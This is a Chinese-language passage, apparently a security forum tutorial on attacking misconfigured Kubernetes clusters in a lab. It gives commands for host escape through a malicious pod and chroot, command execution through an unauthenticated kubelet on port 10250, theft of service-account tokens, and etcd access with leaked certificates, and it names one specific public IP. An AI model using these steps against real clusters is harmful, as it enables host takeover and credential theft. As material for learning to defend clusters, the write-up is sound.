### 解决方案尝试

通过网络搜索，找到了一种常见的解决方案，但测试后发现并不可行：

安装 `wscat`：

```
npm install -g wscat
```

![安装wscat](https://bbs.kanxue.com/upload/attach/202205/809626_S9HVMSG8D2SVKR2.jpg)

![连接失败](https://bbs.kanxue.com/upload/attach/202205/809626_Z8NP829629NEVPM.jpg)

此外还遇到了一个错误，如下图所示：

![错误信息](https://bbs.kanxue.com/upload/attach/202205/809626_NFQBT7JZKQRVAAE.jpg)

起初猜测是本地 `kubectl` 与服务端版本不一致导致的，但经过排查发现即使在 K8s 服务器上执行同样的命令也会出现相同的错误。

随后又尝试了另一种方法，虽然原因未知，但确实有效：

```
./kubectl --insecure-skip-tls-verify -s https://ip:6443 get pods
```

### 恶意 Pod 利用

既然已经可以通过 POST 方式创建 Pod，那么可以通过创建恶意 Pod 并利用 `chroot` 获取宿主机权限：

```
./kubectl --insecure-skip-tls-verify -s https://ip:6443 --namespace=default exec -it test-4444 bash
```

![创建恶意Pod](https://bbs.kanxue.com/upload/attach/202205/809626_YDGFMRFS64YFQMN.jpg)

可以看到我们已经成功创建了恶意 Pod，并通过挂载宿主机根目录到 `/host` 目录，使用 `chroot` 进入了宿主机：

![进入宿主机](https://bbs.kanxue.com/upload/attach/202205/809626_8FAZNBR7UQW4MKG.jpg)

成功进入宿主机后，可以在 `/root` 目录下看到 `metarget` 文件夹，创建一个文件进行验证：

![验证成功](https://bbs.kanxue.com/upload/attach/202205/809626_7J4Z8EWC8FAGHC8.png)

## 五、k8s kubelet 10250端口未授权

### 漏洞复现

正常情况下访问该端口会提示未授权：

![未授权提示](https://bbs.kanxue.com/upload/attach/202205/809626_JTRDYUS2987QY6V.jpg)

直接访问该端口会返回 404：

![404错误](https://bbs.kanxue.com/upload/attach/202205/809626_PJ23HEGM7GSED68.jpg)

但如果将 `/var/lib/kubelet/config.yml` 配置错误地修改为如下内容：

![config.yml修改](https://bbs.kanxue.com/upload/attach/202205/809626_DBKPPHQPB5EFKPR.jpg)

随后将 `authorization.mode` 修改为 `AlwaysAllow`：

![修改authorization.mode](https://bbs.kanxue.com/upload/attach/202205/809626_NM2SNWQ7GMWGMSF.jpg)

重启 Kubelet 服务使其生效：

```
systemctl restart kubelet
```

![重启kubelet](https://bbs.kanxue.com/upload/attach/202205/809626_NUAKBSUJTZESKE4.jpg)

再次访问该端口，发现已经不需要认证了。

### 1、执行命令

通过以下 API 执行命令：

```
curl -XPOST -k "https://${IP_ADDRESS}:10250/run/<namespace>/<pod>/<container>" -d "cmd=<command-to-run>"
```

这里需要三个参数：

- `namespace`
- `pod`
- `container`

可以通过访问以下地址获取这些信息：

```
https://8.210.134.222:10250/runningpods/
```

![获取运行中Pod](https://bbs.kanxue.com/upload/attach/202205/809626_SFQNV3VPFU4M3F2.jpg)

![获取运行中Pod](https://bbs.kanxue.com/upload/attach/202205/809626_5D2NR9RXXRQRARD.jpg)

### 2、获取凭证

```bash
curl -XPOST -k https://ip:10250/run/default/attacker/ubuntu -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

一个 Pod 会关联一个服务账户，该服务账户的凭证（token）会被放入该 Pod 中每个容器的文件系统树中，位置是 `/var/run/secrets/kubernetes.io/serviceaccount/token`。

如果服务账号（Service Account）绑定了 `cluster-admin`（即集群的 admin 权限，可以操作所有 namespace 下的资源），那么就可以利用这个 token 进行一系列的操作。

![获取token](https://bbs.kanxue.com/upload/attach/202205/809626_HNA9HV3J77RQ9M2.jpg)

经过测试，该 token 可以登录 dashboard。如果绑定的权限足够，完全可以通过这个 token 登录 dashboard。

![登录dashboard](https://bbs.kanxue.com/upload/attach/202205/809626_R7SK8RSKU4QJKEG.jpg)

## 六、etcd未授权

### 为什么会出现 etcd 未授权

在启动 `etcd` 时，如果没有指定 `--client-cert-auth` 参数打开证书校验，并且把 `listen-client-urls` 监听修改为 `0.0.0.0`，那么也就意味着这个端口被暴露在外。如果没有通过安全组防火墙的限制，就会造成危害。

`etcd` 默认端口为 `2379`。

> 注意：在安装 K8s 之后，默认的配置下 `2379` 端口只监听 `127.0.0.1`，而不会监听 `0.0.0.0`，所以最多只能本地访问，无法公网访问。

![默认端口监听](https://bbs.kanxue.com/upload/attach/202205/809626_7TS3KQYHQWGUPGW.jpg)

手动搭建的集群：

![手动搭建集群](https://bbs.kanxue.com/upload/attach/202205/809626_DVUQF74MPWMS7V8.jpg)

可以发现，除了监听本地的私有地址之外，也就只有 `127.0.0.1` 了。

### 错误的配置：缺少 `--client-cert-auth`

![etcd配置](https://bbs.kanxue.com/upload/attach/202205/809626_FAS36UFX2EBM8AW.jpg)

`etcd` 的配置文件位于 `/etc/kubernetes/manifests/etcd.yaml`。

![etcd.yaml配置文件](https://bbs.kanxue.com/upload/attach/202205/809626_JMUBTHB235JMAGF.jpg)

如果此时将 `--client-cert-auth` 参数写入到这个配置文件中：

- 在打开证书校验选项后，通过本地 `127.0.0.1:2379` 地址可以免认证访问 `Etcd` 服务，但通过其他地址访问时需要携带证书进行认证访问。
- 在未使用 `--client-cert-auth` 参数打开证书校验时，任意地址访问 `Etcd` 服务都不需要进行证书校验，此时 `Etcd` 服务存在未授权访问风险。

### 证书泄露

默认情况下用 `etcdctl` 访问 `2379` 端口需要证书：

![需要证书](https://bbs.kanxue.com/upload/attach/202205/809626_EWYW6Z2ABSASZ7H.png)

但如果证书泄露了，就可以通过证书来访问 `etcd`：

```bash
export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt
export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt
export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key
```
